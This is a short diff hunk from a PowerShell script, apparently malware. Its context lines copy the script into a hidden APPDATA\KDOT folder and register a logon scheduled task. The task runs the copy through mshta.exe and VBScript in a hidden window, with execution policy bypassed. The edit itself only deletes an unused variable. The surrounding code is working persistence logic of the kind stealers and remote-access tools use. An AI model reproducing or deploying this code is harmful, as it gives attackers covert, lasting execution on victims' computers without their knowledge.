@@ -219,7 +219,6 @@ function Invoke-TASKS {
     New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
     $origin = $PSCommandPath
     Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
-    $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1"
     $task_name = "KDOT"
     $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
